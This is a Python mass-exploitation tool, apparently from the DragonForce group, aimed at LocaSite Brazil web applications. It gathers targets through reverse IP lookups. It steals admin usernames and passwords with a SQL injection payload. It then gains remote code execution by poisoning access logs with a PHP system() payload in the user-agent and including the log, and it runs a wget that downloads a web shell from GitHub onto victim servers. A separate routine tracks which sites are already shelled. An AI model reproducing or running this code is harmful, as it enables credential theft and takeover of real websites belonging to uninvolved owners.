import cloudscraper, sys, os, colorama, time, ctypes, datetime, sys, platform
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime
from subprocess import Popen, PIPE

today = date.today()
d2 = today.strftime("%B %d, %Y")

if platform.system()=='Linux':
    os.system('clear')
    sys.stdout.write("\x1b]2;Priv8 Tools DFM\x07")
else:
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'Priv8 Tools DFM | {d2}')



print(f"""{Style.BRIGHT + Fore.RED}
 ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
 ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
 ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
 ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                             
{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
{Style.BRIGHT + Fore.YELLOW}  
                            Priv8 PoC LocasiteBrazil LFI-RCE via Log Poisoning Exploiter
                                   Func reverse ip lookup scan exploitable server
                                            https://dragonforce.io
                                            Telegram: dragonforceio
                                Get Started With (pip install -r requirements.txt)                                                 

{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
""")

def helpdesk():
    print(Style.BRIGHT+"\t\t\tUsage (reverse ip lookup): python exp.py l target.com")
    print(Style.BRIGHT+"\t\t\tUsage (Check Exploitable): python exp.py e dfm_sitelist.txt")
    print(Style.BRIGHT+"\t\t\tUsage (Run Exploit): python exp.py x vulnsite.txt")
    print(Style.BRIGHT+"\t\t\tUsage (Exploit single site): python exp.py s https://target.com/")
    print(Style.BRIGHT+"\t\t\tUsage (Uploaded Shell): python exp.py c vulnsite.txt")

def checkWeb(web):
    urlArr = urlparse(web)
    if(urlArr.scheme=="https"):
        return web.replace("https://","")
    elif(urlArr.scheme=="http"):
        return web.replace("http://","")
    else:
        return web.replace("/","")

def arrweb(site):
    arrays = []
    url = urlparse(site)
    if(url.scheme=="https"):
        newurl = site.replace("https","http")
        arrays.append(newurl)
    arrays.append(site)
    arrays.append(url.netloc.replace("www.",""))
    return arrays

def reverse_ip(target):
    url = checkWeb(target)
    api = "https://api.hackertarget.com/reverseiplookup/?q="
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    res = scraper.get(api+target)
    if(res.status_code==200 and res.text=='error check your search parameter'):
        print(Style.BRIGHT+"\t\t\t\terror check your search parameter")
        sys.exit(0)
        os._exit(0)
    else:
        i = 0
        dfmfile = open('dfm_'+target+'.txt','w')
        for line in res.text:
            dfmfile.write(line)
        dfmfile.close()
        count = open('dfm_'+target+'.txt','r')
        c = count.readlines()
        for no in c:
            i += 1
        print(Fore.BLUE+"\t\t\t\t\t\tTotal site found: {}".format(i))

def arglength():
    if(len(sys.argv)>3 or len(sys.argv)<=1):
        return False
    else:
        return True

def position(arr,types):
    if(types=="l" or types=="e" or types=="x" or types=="c" or types=="s"):
        return arr.index(types) + 1
    else:
        print(Style.BRIGHT+"\t\t\t\t\tCommand not found!")
        helpdesk()
        sys.exit(0)
        os._exit(0)

def splitter(text):
    one = text.split('/home/')
    two = one[1].split('/public_html/')
    return two[0]

def sqli(site):
    payload = ".1' union select concat(login,0x3a3a,senha,0x7c7c),2 from tbfuncionarios-- -"
    sqlipath = "estrutura/admin/acesso_rapido.php?id="+payload
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    headers = {"User-agent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"}
    exp = scraper.get(site+'/'+sqlipath,headers=headers,timeout=10)
    if(exp.status_code==200):
        content = exp.text.split('.php&id=')
        data = content[1].split('||">')
        admin = data[0].split('::')
        print(Style.BRIGHT+Fore.GREEN+"Username -> {}\nPassword -> {}".format(admin[0],admin[1]))
    else:
        print("Path inaccessible!")

def checkShelled(wordlist):
    nord = "estrutura/admin/"
    shellFile = "eagle.php"
    shelled = []
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    f = open(wordlist,'r')
    lines = f.readlines()
    for line in lines:
        try:
            shelled1 = scraper.get("https://"+line.replace("\n","")+"/"+shellFile,timeout=5)
            if shelled1.status_code>=200 and "Uploader" in shelled1.text:
                print("https://"+line.replace("\n","")+"/"+shellFile)
                shelled.append("https://"+line.replace("\n","")+"/"+shellFile)
            else:
                shelled2 = scraper.get("https://"+line.replace("\n","")+"/"+nord+shellFile,timeout=5)
                if shelled2.status_code>=200 and "Uploader" in shelled2.text:
                    print("https://"+line.replace("\n","")+"/"+nord+shellFile)
                    shelled.append("https://"+line.replace("\n","")+"/"+nord+shellFile)
        except:
            print(Style.BRIGHT+Fore.RED+"[+]Error while connecting site -> {}".format(line.replace("\n",""))+Style.BRIGHT+Fore.BLUE)

    c = open('shelled.txt','a')
    for sh in shelled:
        c.write(sh+"\n")
    c.close()
    print(Fore.BLUE+"\nShelled site saved in shelled.txt"+Style.BRIGHT+Fore.WHITE)

def single(site):
    urls = arrweb(site)
    path = ["estrutura/admin/query.php","estrutura/admin/"]
    lfi_log = ["error_log","../error_log","../../error_log"]
    files = ["https://raw.githubusercontent.com/EagleTube/LocaSiteWeb_Exploit/main/shell/upl.txt","logs.php"]
    lfi_exp = ["/usr/local/apache/domlogs/","wget "+files[0]+" -O "+files[1]]
    payload_rce = "<?echo'<pre>';system($_REQUEST['eagle']);?>"
    #payload_rce = "HEHEHE"
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    try:
        print("Retrieving authentication details...")
        sqli(site)
        access = scraper.get(site+path[0],timeout=15)
        if access.status_code==200:
            print(Style.BRIGHT+Fore.BLUE+"Retrieving logs...")
            headers = {"User-agent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"}
            getlogs = scraper.get(site+path[0]+'?pg='+lfi_log[0],headers=headers,timeout=30)
            if getlogs.status_code==200:
                print("Poisoning access log user-agent...")
                webuser = splitter(getlogs.text) + "/"
                print(Style.BRIGHT+Fore.GREEN+"Detecting web user -> "+webuser)
                p = Popen(['curl','-A','"'+payload_rce+'"',urls[0]+'/robots.txt'],stdout=PIPE,shell=True)
                (out, err) = p.communicate()
                poison = scraper.get(urls[1],timeout=10);
                if poison.status_code==200:
                    print(Style.BRIGHT+Fore.GREEN+"User-agent poisoned!"+Style.BRIGHT+Fore.BLUE)
                    print(Style.BRIGHT+Fore.YELLOW+"Performing LFI to RCE...")
                    #print(urls[1]+path[0]+'?pg='+lfi_exp[0]+webuser+urls[2]+'&eagle='+lfi_exp[1])
                    rce = scraper.get(urls[1]+path[0]+'?pg='+lfi_exp[0]+webuser+urls[2]+'&eagle='+lfi_exp[1],timeout=20)
                    uploaded = scraper.get(urls[1]+path[1]+files[1],timeout=20)
                    if rce.status_code==200 and (uploaded.status_code==200 and 'EagleEye' in uploaded.text):
                         print(Style.BRIGHT+Fore.GREEN+"Shelled! -> {}".format(urls[1]+path[1]+files[1]))
                    else:
                        print(Style.BRIGHT+Fore.RED+"Blocked by firewall!")
                else:
                    print(Style.BRIGHT+Fore.RED+"Blocked by firewall!")
            else:
                print(Style.BRIGHT+Fore.RED+"Path inaccessible -> {} or loading timeout!"+Style.BRIGHT+Fore.BLUE)
        else:
            print(Style.BRIGHT+Fore.RED+"Not vulnerable -> {}".format(site)+Style.BRIGHT+Fore.BLUE)
            print(access.status_code)
    except:
        print(Style.BRIGHT+Fore.RED+"Error while connecting site -> {}".format(site)+Style.BRIGHT+Fore.BLUE)

def exploiter(wordlist):
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)   
    try:
        f = open(wordlist,'r')
        lines = f.readlines()
        for line in lines:
            target = 'http://'+line.replace('\n','')+'/'
            try:
                single(target)
            except:
                print(Style.BRIGHT+Fore.RED+"Error while connecting site -> {}".format(line.replace("\n",""))+Style.BRIGHT+Fore.BLUE)
        print(Style.BRIGHT+Fore.WHITE+"\nChecking Uploaded Shell\n")
        checkShelled(wordlist)
    except:
        print("File not found!")


def expPath(wordlist):
    exp = "estrutura/admin/layout.php"
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    try:
        f = open(wordlist,'r')
        lines = f.readlines()
        vulnsite = []
        for line in lines:
            try:
                gotcha = scraper.get("http://"+line.replace("\n","")+"/"+exp,timeout=5)
                if(gotcha.status_code==200 or gotcha.status_code==302):
                    print(Style.BRIGHT+Fore.WHITE+"\t\t\t-------------------------------------------------------------")
                    print(Fore.BLUE+"\t\t\tSite may vulnerable for CSRF upload!-> {}".format(line))
                    vulnsite.append(line)
                else:
                    print(Fore.RED+"\t\t\tSeems not exploitable -> {}".format(line))
            except:
                print(Fore.YELLOW+"\t\t\tNo connection -> {} ".format(line))
        save = open('vulnsite.txt','a')
        for vuln in vulnsite:
            save.write(vuln)
        save.close()
        if os.path.isfile('vulnsite.txt'):
            print(Fore.GREEN+"\n\nAll Exploitable site saved in vulnsite.txt")
    except FileNotFoundError:
        print(Fore.RED+"\t\t\t\t\tFile could not be loaded!")

if(arglength()==False):
    helpdesk()
else:
    try:
        target = position(sys.argv,sys.argv[1])
        if(sys.argv[1]=="l"):
            reverse_ip(sys.argv[target])
        elif(sys.argv[1]=="x"):
            exploiter(sys.argv[target])
        elif(sys.argv[1]=="c"):
            checkShelled(sys.argv[target])
        elif(sys.argv[1]=="s"):
            single(sys.argv[target])
        else:
            expPath(sys.argv[target])

    except KeyboardInterrupt:
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
